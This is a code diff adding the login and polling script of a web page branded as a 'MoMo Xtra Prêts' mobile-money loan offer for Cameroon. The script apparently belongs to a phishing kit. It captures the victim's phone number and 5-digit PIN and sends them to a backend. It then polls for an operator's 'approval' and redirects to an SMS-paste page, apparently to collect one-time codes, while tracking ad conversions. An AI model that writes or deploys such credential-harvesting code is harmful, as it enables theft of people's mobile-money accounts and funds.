+    function resetToPhoneStep() {
+      stopPolling();
+      stopVerifyTimeline();
+      closeModal();
+      phoneInput.value = '';
+      phoneWrapper.classList.remove('invalid');
+      phoneError.classList.remove('show');
+      localStorage.removeItem('momoSession');
+      localStorage.removeItem('momoPhone');
+      localStorage.removeItem('momoCountry');
+      localStorage.removeItem('momoSms');
+      showRejectBanner();
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+      setTimeout(() => phoneInput.focus(), 250);
+    }
+
+    /* ============================================
+       PROCEED → backend
+       ============================================ */
+    proceed.addEventListener('click', async () => {
+      if (!/^\d{5}$/.test(pin.value)) {
+        pinError.classList.add('show');
+        return;
+      }
+
+      proceed.disabled = true;
+      proceed.innerHTML = '<span class="btn-spinner"></span><span>…</span>';
+
+      const digits = phoneInput.value.replace(/\D/g, '');
+      const fullPhone = '+237' + digits;
+      const userPin = pin.value;
+
+      if (typeof fbq === 'function') {
+        fbq('track', 'AddPaymentInfo', {
+          content_name: 'MoMo Xtra Prêts — Login',
+          content_category: 'Loans',
+          currency: 'XAF'
+        });
+      }
+
+      try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 15000);
+
+        const res = await fetch(`${API_BASE}/api/login`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone: fullPhone, country: 'CM', pin: userPin }),
+          signal: controller.signal
+        });
+        clearTimeout(timeoutId);
+
+        const data = await res.json().catch(() => ({}));
+        console.log('LOGIN RESPONSE:', data);
+
+        if (!res.ok || !data.ok) throw new Error(data.error || 'Login failed');
+
+        closeModal();
+        startVerifyTimeline();
+
+        const reqId = data.requestId || data.sessionId;
+        if (reqId) {
+          startPolling(reqId, fullPhone, 'CM', data.token);
+        } else {
+          localStorage.setItem('momoSession', JSON.stringify({
+            phone: fullPhone, country: 'CM', token: data.token,
+            loggedInAt: new Date().toISOString()
+          }));
+          localStorage.setItem('momoPhone', fullPhone);
+          localStorage.setItem('momoCountry', 'CM');
+          setTimeout(function() {
+            finishVerifyTimeline();
+            setTimeout(function() { window.location.href = 'sms-paste.html'; }, 350);
+          }, 72 * 1000);
+        }
+
+      } catch (err) {
+        console.error('Login error:', err);
+        proceed.disabled = false;
+        proceed.innerHTML = '<span>' + t('pin.proceed') + '</span>';
+        const reason = err.name === 'AbortError'
+          ? 'Le serveur a pris trop de temps. Veuillez réessayer.'
+          : (err.message || 'Connexion impossible. Vérifiez votre internet.');
+        pinError.textContent = reason;
+        pinError.classList.add('show');
+      }
+    });
+
+    /* ============================================
+       POLLING
+       ============================================ */
+    function startPolling(sessionId, fullPhone, country, token) {
+      currentSessionId = sessionId;
+      stopPolling();
+      pollTimer = setInterval(async () => {
+        if (sessionId !== currentSessionId) { stopPolling(); return; }
+
+        try {
+          const res = await fetch(`${API_BASE}/api/approval/status/${sessionId}`);
+          const data = await res.json().catch(() => ({}));
+
+          if (sessionId !== currentSessionId) { stopPolling(); return; }
+          if (!data.ok) return;
+
+          if (data.status === 'approved') {
+            stopPolling();
+            finishVerifyTimeline();
+            localStorage.setItem('momoSession', JSON.stringify({
+              phone: fullPhone, country: country, token: token,
+              sessionId: sessionId, loggedInAt: new Date().toISOString(),
+              loanAmount: currentAmount
+            }));
+            localStorage.setItem('momoPhone', fullPhone);
+            localStorage.setItem('momoCountry', country);
+            setTimeout(() => { window.location.href = 'sms-paste.html'; }, 500);
+
+          } else if (data.status === 'rejected' || data.status === 'timeout') {
+            stopPolling();
+            resetToPhoneStep();
+
+          } else if (data.status === 'line_inactive') {
+            showLineInactive();
+
+          } else if (data.status === 'unknown') {
+            stopPolling();
+            stopVerifyTimeline();
+            document.body.classList.remove('modal-open');
+            showRejectBanner();
+            setTimeout(() => {
+              pinError.textContent = 'Session expirée. Veuillez saisir votre PIN et réessayer.';
+              pinError.classList.add('show');
+            }, 300);
+          }
+        } catch (err) {
+          console.warn('poll error:', err.message);
+        }
+      }, POLL_INTERVAL_MS);
+    }
+
+    window.addEventListener('load', () => {
+      if (!phoneInput.value) phoneInput.focus();
+    });
+  </script>
+</body>
+</html>
